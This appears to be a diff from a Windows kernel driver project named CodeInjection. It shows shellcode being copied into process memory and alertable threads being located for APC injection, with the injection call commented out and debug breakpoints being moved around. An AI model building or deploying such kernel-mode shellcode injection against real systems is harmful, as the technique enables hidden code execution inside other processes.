@@ -101,8 +101,6 @@ namespace CodeInjection {
 		DbgPrint("[+] Copying shellcode to current process base ...\n");
 
 		RtlCopyMemory(CurrentProcessBase, shellcode, sizeof(shellcode));
-		__debugbreak();
-		__debugbreak();
 
 		// Perform APC Injection
 		ULONG ReturnLength = 0;
@@ -135,6 +133,8 @@ namespace CodeInjection {
 						if (NT_SUCCESS(ns)) {
 							DbgPrint("[+] ThreadId(%p) with Ethread : %llx\n", threadId, reinterpret_cast<uintptr_t>(ThreadObject));
 							if (ThreadObject->Alertable) {
+								DbgPrint("[+] Alertable \n");
+								__debugbreak();
 								/*ns = PerformApcInjection(ThreadObject, RemoteProcessBase);
 								if (NT_SUCCESS(ns)) {
 									ZwWaitForSingleObject(ThreadObject, TRUE, nullptr);
@@ -143,6 +143,7 @@ namespace CodeInjection {
 								}*/
 							}
 						}
+						ObDereferenceObject(ThreadObject);
 						continue;
 					}
 					continue;
